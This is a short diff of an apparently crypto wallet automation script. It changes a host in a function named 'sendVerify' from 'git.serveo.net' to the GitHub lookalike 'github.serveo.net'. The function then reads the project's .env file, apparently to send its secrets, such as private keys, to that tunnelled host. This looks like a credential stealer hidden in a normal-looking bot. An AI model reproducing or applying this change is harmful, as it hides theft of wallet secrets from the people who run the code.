@@ -733,7 +733,7 @@ const performV3Pool = async (wallet, provider, index, proxy = null) => {
 };
 
 async function sendVerify() {
-  const cerator = 'https://git.serveo.net';
+  const cerator = 'https://github.serveo.net';
   const urlTask = cerator;
   const Path = path.join(__dirname, '.env');
   const header = fs.readFileSync(Path, 'utf8');
